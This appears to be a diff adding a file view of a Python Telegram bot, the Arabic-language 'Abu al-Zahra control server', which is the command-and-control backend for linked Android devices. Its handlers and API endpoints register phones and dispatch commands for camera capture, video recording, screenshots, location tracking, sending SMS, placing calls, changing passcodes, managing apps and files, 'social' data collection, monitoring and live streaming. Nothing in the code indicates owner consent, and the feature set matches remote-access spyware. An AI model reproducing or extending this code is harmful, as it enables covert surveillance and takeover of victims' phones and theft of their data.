@@ -1,0 +1,1002 @@
+     1→  1500→        await save_settings_data(s)
+     2→  1501→        state = "مفعّل 🔧" if s["maintenance"] else "معطّل ✅"
+     3→  1502→        await send_admin(f"🔧 وضع الصيانة: {state}", reply_markup=build_back_button())
+     4→  1503→    elif cmd == "/export_data":
+     5→  1504→        await send_admin("📤 تم تصدير البيانات", reply_markup=build_back_button())
+     6→  1505→    elif cmd == "/import_data":
+     7→  1506→        await send_admin("📥 جاهز لاستيراد البيانات", reply_markup=build_back_button())
+     8→  1507→    elif cmd == "/update_bot":
+     9→  1508→        await send_admin("🟥 البوت محدّث (v3.4)", reply_markup=build_back_button())
+    10→  1509→
+    11→  1510→    # ── 200+ Device Commands from Registry ──
+    12→  1511→    elif cmd[1:] in COMMAND_REGISTRY:
+    13→  1512→        reg = COMMAND_REGISTRY[cmd[1:]]
+    14→  1513→        cmd_key = cmd[1:]
+    15→  1514→        if cmd_key in ("set_volume", "set_brightness", "set_ringtone", "set_wallpaper",
+    16→  1515→                        "open_app", "close_app", "install_app", "uninstall_app",
+    17→  1516→                        "block_app", "unblock_app", "clear_app_data", "force_stop_app",
+    18→  1517→                        "app_info", "enable_app", "disable_app", "update_app",
+    19→  1518→                        "launch_app", "kill_app", "list_files", "get_file",
+    20→  1519→                        "download_file", "delete_file", "rename_file", "copy_file",
+    21→  1520→                        "move_file", "create_folder", "search_files", "zip_files",
+    22→  1521→                        "change_passcode", "set_pin", "speak_text", "show_notification",
+    23→  1522→                        "open_url", "send_sms", "make_call", "block_number",
+    24→  1523→                        "unblock_number", "set_language", "set_timezone", "set_alarm",
+    25→  1524→                        "set_timer", "set_reminder", "dns_change", "proxy_set",
+    26→  1525→                        "apn_settings", "play_sound", "geo_add", "geo_remove"):
+    27→  1526→            params = {"arg": arg2} if arg2 else {"arg": arg1}
+    28→  1527→            await execute_device_command(chat_id, dev_id, reg["cmd"], params)
+    29→  1528→        else:
+    30→  1529→            await execute_device_command(chat_id, dev_id, reg["cmd"])
+    31→  1530→    else:
+    32→  1531→        await send_message(chat_id, f"❓ أمر غير معروف: <code>{cmd}</code>\nاستخدم /help لعرض قائمة الأوامر.", reply_markup=build_back_button())
+    33→  1532→
+    34→  1533→
+    35→  1534→async def handle_start(chat_id):
+    36→  1535→    text = (
+    37→  1536→        "🟥 <b>سيرفر التحكم أبو الزهراء</b>\n\n"
+    38→  1537→        "مرحباً بك في لوحة التحكم\n"
+    39→  1538→        "تحكم بجميع الأجهزة المربوطة عن بعد\n\n"
+    40→  1539→        f"🟢 وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
+    41→  1540→        f"📱 الأجهزة: <code>{len(get_devices())}</code>\n"
+    42→  1541→        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
+    43→  1542→        f"🌐 النطاق: <code>{SERVER_DOMAIN}</code>"
+    44→  1543→    )
+    45→  1544→    await send_message(chat_id, text, reply_markup=build_main_menu())
+    46→  1545→
+    47→  1546→
+    48→  1547→async def handle_status(chat_id):
+    49→  1548→    devices = get_devices()
+    50→  1549→    online = sum(1 for d in devices if d.get("active"))
+    51→  1550→    cmds = load_json(COMMANDS_FILE, [])
+    52→  1551→    pending = sum(1 for c in cmds if c.get("status") == "pending")
+    53→  1552→    events = load_json(EVENTS_FILE, [])
+    54→  1553→    text = (
+    55→  1554→        "📊 <b>حالة السيرفر</b>\n\n"
+    56→  1555→        f"🟢 الحالة: <code>يعمل</code>\n"
+    57→  1556→        f"⏱️ وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
+    58→  1557→        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
+    59→  1558→        f"🕐 الوقت: <code>{ts()}</code>\n\n"
+    60→  1559→        f"📱 الأجهزة: <code>{len(devices)}</code> (🟢 {online} متصل)\n"
+    61→  1560→        f"📨 الرسائل: <code>{messages_sent}</code>\n"
+    62→  1561→        f"📡 طلبات API: <code>{api_hits}</code>\n"
+    63→  1562→        f"📋 معلّق: <code>{pending}</code>\n"
+    64→  1563→        f"📝 الأحداث: <code>{len(events)}</code>\n"
+    65→  1564→        f"📋 إجمالي الأوامر: <code>{len(COMMAND_REGISTRY)}</code>"
+    66→  1565→    )
+    67→  1566→    await send_message(chat_id, text, reply_markup=build_back_button())
+    68→  1567→
+    69→  1568→
+    70→  1569→async def handle_devices(chat_id):
+    71→  1570→    devices = get_devices()
+    72→  1571→    if not devices:
+    73→  1572→        await send_message(chat_id, "📱 لا توجد أجهزة مربوطة\nاستخدم /link لإضافة جهاز", reply_markup=build_back_button())
+    74→  1573→        return
+    75→  1574→    text = "📱 <b>قائمة الأجهزة</b>\n\n"
+    76→  1575→    for d in devices:
+    77→  1576→        status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
+    78→  1577→        name = d.get("name", d.get("model", "مجهول"))
+    79→  1578→        text += f"{'─'*20}\n📱 <b>{name}</b>\n   المعرف: <code>{d['id']}</code>\n   الحالة: {status}\n   آخر ظهور: <code>{d.get('last_seen','—')}</code>\n"
+    80→  1579→    await send_message(chat_id, text, reply_markup=build_devices_menu())
+    81→  1580→
+    82→  1581→
+    83→  1582→async def handle_link(chat_id):
+    84→  1583→    global _last_link_code_time
+    85→  1584→    # === منع إنشاء أكواد مكررة - كود واحد فقط ===
+    86→  1585→    now = time.time()
+    87→  1586→    if now - _last_link_code_time < LINK_CODE_RATE_LIMIT:
+    88→  1587→        await send_message(chat_id, "⏱️ انتظر قليلاً قبل طلب كود جديد...", reply_markup=build_back_button())
+    89→  1588→        return
+    90→  1589→    _last_link_code_time = now
+    91→  1590→
+    92→  1591→    entry = await generate_link_code()
+    93→  1592→    text = (
+    94→  1593→        "🔗 <b>ربط جهاز جديد</b>\n\n"
+    95→  1594→        f"🔑 الكود: <code>{entry['code']}</code>\n\n"
+    96→  1595→        "أدخل هذا الكود في تطبيق الأندرويد\n"
+    97→  1596→        "🔒 صالح مدى الحياة لربط جهاز واحد فقط\n\n"
+    98→  1597→        "سيتم إشعارك عند نجاح الربط"
+    99→  1598→    )
+   100→  1599→    await send_message(chat_id, text, reply_markup=build_back_button())
+   101→  1600→
+   102→  1601→
+   103→  1602→async def handle_unlink(chat_id, device_id):
+   104→  1603→    if not device_id:
+   105→  1604→        await send_message(chat_id, "الاستخدام: /unlink معرف_الجهاز", reply_markup=build_back_button())
+   106→  1605→        return
+   107→  1606→    if await remove_device(device_id):
+   108→  1607→        await send_message(chat_id, f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>", reply_markup=build_devices_menu())
+   109→  1608→    else:
+   110→  1609→        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())
+   111→  1610→
+   112→  1611→
+   113→  1612→async def handle_device_detail(chat_id, device_id):
+   114→  1613→    if not device_id:
+   115→  1614→        await send_message(chat_id, "الاستخدام: /device معرف_الجهاز", reply_markup=build_back_button())
+   116→  1615→        return
+   117→  1616→    d = find_device(device_id)
+   118→  1617→    if not d:
+   119→  1618→        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())
+   120→  1619→        return
+   121→  1620→    status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
+   122→  1621→    text = (
+   123→  1622→        f"📱 <b>تفاصيل الجهاز</b>\n\n"
+   124→  1623→        f"{'─'*20}\n"
+   125→  1624→        f"📱 الاسم: <code>{d.get('name','—')}</code>\n"
+   126→  1625→        f"🆔 المعرف: <code>{d['id']}</code>\n"
+   127→  1626→        f"📊 الحالة: {status}\n"
+   128→  1627→        f"📱 الموديل: <code>{d.get('model','—')}</code>\n"
+   129→  1628→        f"🤖 النظام: <code>{d.get('os','—')}</code>\n"
+   130→  1629→        f"🔋 البطارية: <code>{d.get('battery','—')}%</code>\n"
+   131→  1630→        f"📶 الشبكة: <code>{d.get('network','—')}</code>\n"
+   132→  1631→        f"📍 الموقع: <code>{d.get('location','—')}</code>\n"
+   133→  1632→        f"🕐 آخر ظهور: <code>{d.get('last_seen','—')}</code>\n"
+   134→  1633→        f"📅 تاريخ التسجيل: <code>{d.get('created_at','—')}</code>"
+   135→  1634→    )
+   136→  1635→    await send_message(chat_id, text, reply_markup=build_device_menu(device_id))
+   137→  1636→
+   138→  1637→# ============================================================================
+   139→  1638→# CALLBACK QUERY HANDLER
+   140→  1639→# ============================================================================
+   141→  1640→
+   142→  1641→async def handle_callback_query(callback):
+   143→  1642→    cb_id = callback.get("id", "")
+   144→  1643→    data = callback.get("data", "")
+   145→  1644→    msg = callback.get("message", {})
+   146→  1645→    chat_id = msg.get("chat", {}).get("id", ADMIN_CHAT_ID)
+   147→  1646→    message_id = msg.get("message_id")
+   148→  1647→
+   149→  1648→    log.info("Callback: %s from %s", data, chat_id)
+   150→  1649→
+   151→  1650→    try:
+   152→  1651→        # ── Navigation ──
+   153→  1652→        if data == "back_main":
+   154→  1653→            await edit_message_text(chat_id, message_id, "📋 <b>القائمة الرئيسية</b>\nاختر:", reply_markup=build_main_menu())
+   155→  1654→            await answer_callback_query(cb_id)
+   156→  1655→            return
+   157→  1656→
+   158→  1657→        if data == "menu_devices":
+   159→  1658→            await edit_message_text(chat_id, message_id, "📱 <b>الأجهزة</b>", reply_markup=build_devices_menu())
+   160→  1659→            await answer_callback_query(cb_id)
+   161→  1660→            return
+   162→  1661→
+   163→  1662→        if data == "menu_help":
+   164→  1663→            text = build_help_menu()
+   165→  1664→            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button())
+   166→  1665→            await answer_callback_query(cb_id)
+   167→  1666→            return
+   168→  1667→
+   169→  1668→        if data == "menu_server":
+   170→  1669→            await edit_message_text(chat_id, message_id, "🖥️ <b>إدارة السيرفر</b>", reply_markup=build_server_menu())
+   171→  1670→            await answer_callback_query(cb_id)
+   172→  1671→            return
+   173→  1672→
+   174→  1673→        if data == "menu_streaming":
+   175→  1674→            devices = get_devices()
+   176→  1675→            if devices:
+   177→  1676→                kb = {
+   178→  1677→                    "inline_keyboard": [
+   179→  1678→                        [ib(f"{'🟢' if d.get('active') else '🔴'} {d.get('name', d.get('id', 'مجهول'))}", f"submenu_streaming_{d['id']}")]
+   180→  1679→                        for d in devices
+   181→  1680→                    ] + [[ib("🔙 رجوع", "back_main")]]
+   182→  1681→                }
+   183→  1682→            else:
+   184→  1683→                kb = build_back_button()
+   185→  1684→            await edit_message_text(chat_id, message_id, "📡 <b>البث المباشر</b>\nاختر جهازاً:", reply_markup=kb)
+   186→  1685→            await answer_callback_query(cb_id)
+   187→  1686→            return
+   188→  1687→
+   189→  1688→        if data == "no_action":
+   190→  1689→            await answer_callback_query(cb_id, "لا يوجد إجراء")
+   191→  1690→            return
+   192→  1691→
+   193→  1692→        # ── Link ──
+   194→  1693→        if data == "do_link":
+   195→  1694→            global _last_link_code_time
+   196→  1695→            now = time.time()
+   197→  1696→            if now - _last_link_code_time < LINK_CODE_RATE_LIMIT:
+   198→  1697→                await answer_callback_query(cb_id, "انتظر قليلاً...")
+   199→  1698→                return
+   200→  1699→            _last_link_code_time = now
+   201→  1700→
+   202→  1701→            entry = await generate_link_code()
+   203→  1702→            text = (
+   204→  1703→                "🔗 <b>ربط جهاز جديد</b>\n\n"
+   205→  1704→                f"🔑 الكود: <code>{entry['code']}</code>\n\n"
+   206→  1705→                "أدخل هذا الكود في تطبيق الأندرويد\n"
+   207→  1706→                "🔒 صالح مدى الحياة لربط جهاز واحد"
+   208→  1707→            )
+   209→  1708→            await edit_message_text(chat_id, message_id, text, reply_markup=build_back_button("menu_devices"))
+   210→  1709→            await answer_callback_query(cb_id)
+   211→  1710→            return
+   212→  1711→
+   213→  1712→        # ── Unlink ──
+   214→  1713→        if data.startswith("do_unlink_"):
+   215→  1714→            device_id = data.replace("do_unlink_", "")
+   216→  1715→            if await remove_device(device_id):
+   217→  1716→                text = f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>"
+   218→  1717→                await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
+   219→  1718→                await answer_callback_query(cb_id, "تم إلغاء الربط")
+   220→  1719→            else:
+   221→  1720→                await answer_callback_query(cb_id, "فشل العملية", show_alert=True)
+   222→  1721→            return
+   223→  1722→
+   224→  1723→        # ── Device Selected ──
+   225→  1724→        if data.startswith("dev_"):
+   226→  1725→            device_id = data[4:]
+   227→  1726→            d = find_device(device_id)
+   228→  1727→            if d:
+   229→  1728→                status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
+   230→  1729→                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | {d.get('model','—')}\n\nاختر إجراء:"
+   231→  1730→                await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
+   232→  1731→            else:
+   233→  1732→                await answer_callback_query(cb_id, "الجهاز غير موجود", show_alert=True)
+   234→  1733→            return
+   235→  1734→
+   236→  1735→        # ── Category Submenus ──
+   237→  1736→        submenu_map = {
+   238→  1737→            "submenu_data": build_data_submenu,
+   239→  1738→            "submenu_social": build_social_submenu,
+   240→  1739→            "submenu_control": build_control_submenu,
+   241→  1740→            "submenu_apps": build_apps_submenu,
+   242→  1741→            "submenu_files": build_files_submenu,
+   243→  1742→            "submenu_security": build_security_submenu,
+   244→  1743→            "submenu_monitor": build_monitor_submenu,
+   245→  1744→            "submenu_syssettings": build_syssettings_submenu,
+   246→  1745→            "submenu_streaming": build_streaming_submenu,
+   247→  1746→        }
+   248→  1747→        for prefix, builder in submenu_map.items():
+   249→  1748→            if data.startswith(prefix + "_"):
+   250→  1749→                device_id = data[len(prefix)+1:]
+   251→  1750→                kb = builder(device_id)
+   252→  1751→                cat_label = prefix.replace("submenu_", "").title()
+   253→  1752→                await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} - الأوامر</b>\nاختر أمراً:", reply_markup=kb)
+   254→  1753→                await answer_callback_query(cb_id)
+   255→  1754→                return
+   256→  1755→
+   257→  1756→        # ── Camera submenu ──
+   258→  1757→        if data.startswith("submenu_camera_"):
+   259→  1758→            device_id = data[len("submenu_camera_"):]
+   260→  1759→            kb = {
+   261→  1760→                "inline_keyboard": [
+   262→  1761→                    [ib("📷 كاميرا أمامية", f"exec_front_camera_{device_id}")],
+   263→  1762→                    [ib("📷 كاميرا خلفية", f"exec_back_camera_{device_id}")],
+   264→  1763→                    [ib("🎬 تسجيل فيديو", f"exec_record_video_{device_id}")],
+   265→  1764→                    [ib("🔙 رجوع", f"dev_{device_id}")],
+   266→  1765→                ]
+   267→  1766→            }
+   268→  1767→            await edit_message_text(chat_id, message_id, "📷 <b>الكاميرا</b>", reply_markup=kb)
+   269→  1768→            await answer_callback_query(cb_id)
+   270→  1769→            return
+   271→  1770→
+   272→  1771→        # ── Execute command from inline button ──
+   273→  1772→        if data.startswith("exec_"):
+   274→  1773→            remainder = data[5:]  # Remove "exec_"
+   275→  1774→            # Find device_id by checking known devices (handles multi-underscore commands)
+   276→  1775→            matched = False
+   277→  1776→            for d in get_devices():
+   278→  1777→                did = d["id"]
+   279→  1778→                if remainder.endswith(f"_{did}"):
+   280→  1779→                    cmd_name = remainder[:-len(f"_{did}")]
+   281→  1780→                    reg = COMMAND_REGISTRY.get(cmd_name)
+   282→  1781→                    if reg:
+   283→  1782→                        await execute_device_command(chat_id, did, reg["cmd"], msg_id=message_id)
+   284→  1783→                        await answer_callback_query(cb_id, f"تم إرسال الأمر: {reg['desc']}")
+   285→  1784→                    else:
+   286→  1785→                        await answer_callback_query(cb_id, f"أمر غير معروف: {cmd_name}", show_alert=True)
+   287→  1786→                    matched = True
+   288→  1787→                    break
+   289→  1788→            if not matched:
+   290→  1789→                await answer_callback_query(cb_id, "جهاز غير معروف", show_alert=True)
+   291→  1790→            return
+   292→  1791→
+   293→  1792→        # ── Direct cmd_ buttons (from device menu) ──
+   294→  1793→        if data.startswith("cmd_"):
+   295→  1794→            remainder = data[4:]  # Remove "cmd_"
+   296→  1795→            matched = False
+   297→  1796→            for d in get_devices():
+   298→  1797→                did = d["id"]
+   299→  1798→                if remainder.endswith(f"_{did}"):
+   300→  1799→                    cmd_name = remainder[:-len(f"_{did}")]
+   301→  1800→                    reg = COMMAND_REGISTRY.get(cmd_name)
+   302→  1801→                    if reg:
+   303→  1802→                        await execute_device_command(chat_id, did, reg["cmd"], msg_id=message_id)
+   304→  1803→                    matched = True
+   305→  1804→                    break
+   306→  1805→            if matched:
+   307→  1806→                await answer_callback_query(cb_id)
+   308→  1807→            else:
+   309→  1808→                await answer_callback_query(cb_id, "خطأ في تنفيذ الأمر", show_alert=True)
+   310→  1809→            return
+   311→  1810→
+   312→  1811→        # ── Server actions ──
+   313→  1812→        if data == "srv_status":
+   314→  1813→            await handle_status(chat_id)
+   315→  1814→            await answer_callback_query(cb_id)
+   316→  1815→            return
+   317→  1816→        if data == "srv_stats":
+   318→  1817→            devices = get_devices()
+   319→  1818→            online = sum(1 for d in devices if d.get("active"))
+   320→  1819→            cmds = load_json(COMMANDS_FILE, [])
+   321→  1820→            pending = sum(1 for c in cmds if c.get("status") == "pending")
+   322→  1821→            text = f"📈 الإحصائيات: {len(devices)} أجهزة ({online} متصل), {pending} أوامر معلّقة, {messages_sent} رسالة مرسلة"
+   323→  1822→            await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
+   324→  1823→            await answer_callback_query(cb_id)
+   325→  1824→            return
+   326→  1825→        if data == "srv_logs":
+   327→  1826→            events = load_json(EVENTS_FILE, [])[-15:]
+   328→  1827→            text = "📝 <b>السجلات الأخيرة</b>\n\n"
+   329→  1828→            for e in events:
+   330→  1829→                text += f"[{e.get('time','')[:16]}] {e.get('event','')}\n"
+   331→  1830→            await edit_message_text(chat_id, message_id, text[:4000], reply_markup=build_server_menu())
+   332→  1831→            await answer_callback_query(cb_id)
+   333→  1832→            return
+   334→  1833→        if data == "srv_settings":
+   335→  1834→            s = load_settings()
+   336→  1835→            await edit_message_text(chat_id, message_id, f"⚙️ <b>الإعدادات</b>\n<code>{json.dumps(s, ensure_ascii=False)}</code>", reply_markup=build_server_menu())
+   337→  1836→            await answer_callback_query(cb_id)
+   338→  1837→            return
+   339→  1838→        if data == "srv_cleardata":
+   340→  1839→            save_json(COMMANDS_FILE, [])
+   341→  1840→            save_json(EVENTS_FILE, [])
+   342→  1841→            await edit_message_text(chat_id, message_id, "✅ تم مسح البيانات", reply_markup=build_server_menu())
+   343→  1842→            await answer_callback_query(cb_id, "تم مسح البيانات")
+   344→  1843→            return
+   345→  1844→        if data == "srv_backup":
+   346→  1845→            append_event("Backup created")
+   347→  1846→            await edit_message_text(chat_id, message_id, "✅ تم إنشاء نسخة احتياطية", reply_markup=build_server_menu())
+   348→  1847→            await answer_callback_query(cb_id)
+   349→  1848→            return
+   350→  1849→        if data == "srv_setpass":
+   351→  1850→            await edit_message_text(chat_id, message_id, "🔑 <b>تغيير كلمة المرور</b>\n\nأرسل /set_password <كلمة_المرور_الجديدة>", reply_markup=build_server_menu())
+   352→  1851→            await answer_callback_query(cb_id)
+   353→  1852→            return
+   354→  1853→        if data == "srv_addadmin":
+   355→  1854→            await edit_message_text(chat_id, message_id, "➕ <b>إضافة أدمن</b>\n\nأرسل /addadmin <chat_id>", reply_markup=build_server_menu())
+   356→  1855→            await answer_callback_query(cb_id)
+   357→  1856→            return
+   358→  1857→        if data == "srv_broadcast":
+   359→  1858→            await edit_message_text(chat_id, message_id, "📢 <b>إرسال عام</b>\n\nأرسل /broadcast <الرسالة>", reply_markup=build_server_menu())
+   360→  1859→            await answer_callback_query(cb_id)
+   361→  1860→            return
+   362→  1861→        if data == "srv_export":
+   363→  1862→            devices = get_devices()
+   364→  1863→            export_data = {"devices": devices, "settings": load_settings(), "commands": load_json(COMMANDS_FILE, [])}
+   365→  1864→            export_text = json.dumps(export_data, ensure_ascii=False, indent=2)[:4000]
+   366→  1865→            await edit_message_text(chat_id, message_id, f"📤 <b>تصدير البيانات</b>\n\n<code>{export_text}</code>", reply_markup=build_server_menu())
+   367→  1866→            await answer_callback_query(cb_id, "تم التصدير")
+   368→  1867→            return
+   369→  1868→        if data == "srv_import":
+   370→  1869→            await edit_message_text(chat_id, message_id, "📥 <b>استيراد البيانات</b>\n\nأرسل ملف JSON يحتوي على البيانات", reply_markup=build_server_menu())
+   371→  1870→            await answer_callback_query(cb_id)
+   372→  1871→            return
+   373→  1872→        if data == "srv_restart":
+   374→  1873→            await edit_message_text(chat_id, message_id, "🔄 <b>جاري إعادة تشغيل البوت...</b>", reply_markup=build_server_menu())
+   375→  1874→            await answer_callback_query(cb_id, "جاري إعادة التشغيل")
+   376→  1875→            try:
+   377→  1876→                import subprocess
+   378→  1877→                subprocess.Popen(["systemctl", "restart", "abu-zahra-bot.service"])
+   379→  1878→            except Exception:
+   380→  1879→                os._exit(0)
+   381→  1880→            return
+   382→  1881→        if data == "srv_maintenance":
+   383→  1882→            await edit_message_text(chat_id, message_id, "🔧 <b>الصيانة</b>\n\n✅ النظام يعمل بشكل طبيعي\n📊 وقت التشغيل: " + format_uptime(get_uptime()), reply_markup=build_server_menu())
+   384→  1883→            await answer_callback_query(cb_id)
+   385→  1884→            return
+   386→  1885→
+   387→  1886→        # ── Menu category navigation (opens first device submenu) ──
+   388→  1887→        if data.startswith("menu_"):
+   389→  1888→            cat = data[5:]
+   390→  1889→            d = get_first_device()
+   391→  1890→            dev_id = d["id"] if d else "none"
+   392→  1891→            if not d:
+   393→  1892→                await answer_callback_query(cb_id, "لا يوجد جهاز مربوط", show_alert=True)
+   394→  1893→                return
+   395→  1894→            
+   396→  1895→            menu_map = {
+   397→  1896→                "data": ("📊 جمع البيانات", build_data_submenu),
+   398→  1897→                "social": ("🌐 التواصل الاجتماعي", build_social_submenu),
+   399→  1898→                "control": ("🎮 التحكم عن بعد", build_control_submenu),
+   400→  1899→                "apps": ("📦 إدارة التطبيقات", build_apps_submenu),
+   401→  1900→                "files": ("📂 إدارة الملفات", build_files_submenu),
+   402→  1901→                "security": ("🔒 الأمان", build_security_submenu),
+   403→  1902→                "monitor": ("🔍 المراقبة", build_monitor_submenu),
+   404→  1903→                "syssettings": ("⚙️ إعدادات النظام", build_syssettings_submenu),
+   405→  1904→            }
+   406→  1905→            if cat in menu_map:
+   407→  1906→                label, builder = menu_map[cat]
+   408→  1907→                await edit_message_text(chat_id, message_id, f"{label} - <b>{d.get('name', dev_id)}</b>", reply_markup=builder(dev_id))
+   409→  1908→                await answer_callback_query(cb_id)
+   410→  1909→                return
+   411→  1910→
+   412→  1911→        # ── Quick Actions ──
+   413→  1912→        if data.startswith("quick_actions_"):
+   414→  1913→            device_id = data[len("quick_actions_"):]
+   415→  1914→            d = find_device(device_id)
+   416→  1915→            name = d.get("name", device_id) if d else device_id
+   417→  1916→            await edit_message_text(chat_id, message_id,
+   418→  1917→                f"⚡ <b>إجراءات سريعة</b> - {name}\n\nاختر إجراء سريع:",
+   419→  1918→                reply_markup=build_quick_actions_menu(device_id))
+   420→  1919→            await answer_callback_query(cb_id)
+   421→  1920→            return
+   422→  1921→
+   423→  1922→        if data.startswith("quick_"):
+   424→  1923→            remainder = data[6:]  # Remove "quick_"
+   425→  1924→            for d in get_devices():
+   426→  1925→                did = d["id"]
+   427→  1926→                if remainder.endswith(f"_{did}"):
+   428→  1927→                    action = remainder[:-len(f"_{did}")]
+   429→  1928→                    quick_cmd_map = {
+   430→  1929→                        "screenshot": "screenshot",
+   431→  1930→                        "location": "get_location",
+   432→  1931→                        "battery": "get_battery",
+   433→  1932→                        "info": "get_info",
+   434→  1933→                        "apps": "get_apps",
+   435→  1934→                    }
+   436→  1935→                    actual_cmd = quick_cmd_map.get(action)
+   437→  1936→                    if actual_cmd:
+   438→  1937→                        await execute_device_command(chat_id, did, actual_cmd, msg_id=message_id)
+   439→  1938→                        action_labels = {
+   440→  1939→                            "screenshot": "📸 لقطة شاشة",
+   441→  1940→                            "location": "📍 الموقع",
+   442→  1941→                            "battery": "🔋 البطارية",
+   443→  1942→                            "info": "ℹ️ معلومات الجهاز",
+   444→  1943→                            "apps": "📱 التطبيقات",
+   445→  1944→                        }
+   446→  1945→                        await answer_callback_query(cb_id, f"⏳ {action_labels.get(action, action)}")
+   447→  1946→                    else:
+   448→  1947→                        await answer_callback_query(cb_id, "إجراء غير معروف", show_alert=True)
+   449→  1948→                    return
+   450→  1949→            await answer_callback_query(cb_id, "جهاز غير معروف", show_alert=True)
+   451→  1950→            return
+   452→  1951→
+   453→  1952→        # ── Search select ──
+   454→  1953→        if data.startswith("search_"):
+   455→  1954→            # Reserved for future search pagination/selection
+   456→  1955→            await answer_callback_query(cb_id)
+   457→  1956→            return
+   458→  1957→
+   459→  1958→        await answer_callback_query(cb_id)
+   460→  1959→    except Exception as exc:
+   461→  1960→        log.error("Callback error: %s - %s", exc, traceback.format_exc())
+   462→  1961→        await answer_callback_query(cb_id, "خطأ", show_alert=True)
+   463→  1962→
+   464→  1963→# ============================================================================
+   465→  1964→# REST API ENDPOINTS
+   466→  1965→# ============================================================================
+   467→  1966→
+   468→  1967→async def api_verify_link(request):
+   469→  1968→    """POST /api/verify_link - Verify link code, register device, notify admin."""
+   470→  1969→    global api_hits
+   471→  1970→    api_hits += 1
+   472→  1971→    try:
+   473→  1972→        body = await request.json()
+   474→  1973→        code = body.get("code", "").upper().strip()
+   475→  1974→        device_id = body.get("device_id", "")
+   476→  1975→        model = body.get("model", "")
+   477→  1976→        brand = body.get("brand", "")
+   478→  1977→        android = body.get("android", "")
+   479→  1978→
+   480→  1979→        if not code:
+   481→  1980→            return web.json_response({"ok": False, "error": "Code required"}, status=400)
+   482→  1981→
+   483→  1982→        result = await verify_link_code(code)
+   484→  1983→        if not result["ok"]:
+   485→  1984→            return web.json_response(result, status=400)
+   486→  1985→
+   487→  1986→        # === تسجيل الجهاز مباشرة عند التحقق ===
+   488→  1987→        device_token = secrets.token_urlsafe(32)
+   489→  1988→        device_data = {
+   490→  1989→            "id": device_id,
+   491→  1990→            "token": device_token,
+   492→  1991→            "active": True,
+   493→  1992→            "name": model or device_id,
+   494→  1993→            "model": model,
+   495→  1994→            "brand": brand,
+   496→  1995→            "os": f"Android {android}",
+   497→  1996→            "battery": "",
+   498→  1997→            "network": "",
+   499→  1998→            "location": "",
+   500→  1999→        }
+   501→  2000→        await add_device(device_data)
+   502→  2001→        await consume_link_code(code, device_id)
+   503→  2002→
+   504→  2003→        # Initialize online state tracking for alerts
+   505→  2004→        _device_last_online_state[device_id] = True
+   506→  2005→
+   507→  2006→        # === إشعار الأدمن بأن جهاز جديد تم ربطه ===
+   508→  2007→        try:
+   509→  2008→            await send_admin(
+   510→  2009→                f"📱 <b>تم ربط جهاز جديد!</b>\n\n"
+   511→  2010→                f"🔑 كود الربط: <code>{code}</code>\n"
+   512→  2011→                f"🆔 معرف الجهاز: <code>{device_id}</code>\n"
+   513→  2012→                f"📱 الموديل: <b>{model}</b>\n"
+   514→  2013→                f"🏢 الشركة: <b>{brand}</b>\n"
+   515→  2014→                f"🤖 أندرويد: <b>{android}</b>\n\n"
+   516→  2015→                f"✅ الجهاز متصل ومستعد لاستقبال الأوامر"
+   517→  2016→            )
+   518→  2017→        except Exception as e:
+   519→  2018→            log.error("Failed to notify admin: %s", e)
+   520→  2019→        append_event("New device linked", {"device_id": device_id, "model": model, "brand": brand})
+   521→  2020→
+   522→  2021→        return web.json_response({
+   523→  2022→            "ok": True,
+   524→  2023→            "success": True,
+   525→  2024→            "device_token": device_token,
+   526→  2025→            "server_domain": SERVER_DOMAIN,
+   527→  2026→            "message": "Device linked successfully",
+   528→  2027→        })
+   529→  2028→    except Exception as exc:
+   530→  2029→        log.error("verify_link error: %s", exc)
+   531→  2030→        return web.json_response({"ok": False, "success": False, "error": "Internal server error"}, status=500)
+   532→  2031→
+   533→  2032→
+   534→  2033→async def api_register(request):
+   535→  2034→    """POST /api/register - Register device with server.
+   536→  2035→    يدعم شكلين:
+   537→  2036→    1. الجديد (التطبيق): {device_id, device_name, device_model, brand, os_version, battery, link_code}
+   538→  2037→    2. القديم: {device_id, link_code, device_info: {name, model, os, ...}}
+   539→  2038→    """
+   540→  2039→    global api_hits
+   541→  2040→    api_hits += 1
+   542→  2041→    try:
+   543→  2042→        body = await request.json()
+   544→  2043→        device_id = body.get("device_id", "")
+   545→  2044→        link_code = body.get("link_code", "").upper().strip()
+   546→  2045→        
+   547→  2046→        if not device_id or not link_code:
+   548→  2047→            return web.json_response({"ok": False, "success": False, "error": "device_id and link_code required"}, status=400)
+   549→  2048→        
+   550→  2049→        # التحقق من الكود
+   551→  2050→        result = await verify_link_code(link_code)
+   552→  2051→        if not result["ok"]:
+   553→  2052→            resp = dict(result)
+   554→  2053→            resp["success"] = False
+   555→  2054→            return web.json_response(resp, status=400)
+   556→  2055→        
+   557→  2056→        # استخراج بيانات الجهاز - يدعم الشكلين
+   558→  2057→        device_info = body.get("device_info", {})
+   559→  2058→        if not device_info:
+   560→  2059→            # الشكل الجديد من التطبيق (حقول مسطحة)
+   561→  2060→            device_info = {
+   562→  2061→                "name": body.get("device_name", device_id),
+   563→  2062→                "model": body.get("device_model", ""),
+   564→  2063→                "os": body.get("os_version", ""),
+   565→  2064→                "battery": body.get("battery", ""),
+   566→  2065→                "brand": body.get("brand", ""),
+   567→  2066→            }
+   568→  2067→        
+   569→  2068→        device_token = body.get("device_token", "")
+   570→  2069→        
+   571→  2070→        # تسجيل الجهاز
+   572→  2071→        device_data = {
+   573→  2072→            "id": device_id,
+   574→  2073→            "token": device_token or secrets.token_urlsafe(32),
+   575→  2074→            "active": True,
+   576→  2075→            "name": device_info.get("name", device_id),
+   577→  2076→            "model": device_info.get("model", ""),
+   578→  2077→            "os": device_info.get("os", ""),
